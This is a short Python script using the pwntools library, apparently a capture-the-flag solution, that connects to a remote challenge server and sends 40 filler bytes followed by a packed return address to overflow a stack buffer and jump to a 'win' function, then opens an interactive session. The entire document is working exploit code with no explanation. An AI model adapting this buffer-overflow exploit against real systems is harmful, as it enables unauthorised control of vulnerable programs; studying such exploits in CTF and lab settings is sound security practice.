from pwn import *

buf = 'A'*40

win_addr = p64(0x4006a7)

p = remote('sharkyctf.xyz', 20333)

payload = ''
payload += buf	
payload +=win_addr

p.sendline(payload)
p.interactive()